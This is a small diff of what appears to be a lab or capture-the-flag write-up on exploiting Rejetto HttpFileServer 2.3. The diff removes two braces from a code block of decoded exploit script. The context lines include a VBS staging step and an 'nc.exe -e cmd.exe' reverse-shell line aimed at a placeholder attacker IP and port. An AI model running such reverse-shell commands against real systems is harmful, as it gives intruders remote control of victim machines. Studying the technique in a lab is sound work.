@@ -60,7 +60,6 @@ We do see this is Rejetto HttpFileServer 2.3 version. This has a vulnerability t
 
 Decoding some of the script, we can easily understand the intent: 
 ```java
-{
 ip_addr = "attacker ip" #local IP address
 local_port = "listening port" # Local Port number
 
@@ -78,7 +77,6 @@ end with
 
 vbs2 = cscript.exe C:\Users\Public\script.vbs
 vbs3 = "C:\Users\Public\nc.exe -e cmd.exe " ip_addr " " local_port
-}
 ```
 After URL Decoding the portions of the script that are encoded, we can see this script intends to utilize vbs script creation in order to reach back to our attacker machine, grab netcat, and then use netcat to reach back to our attacker IP and Port that is stagged on our end with netcat. 
 
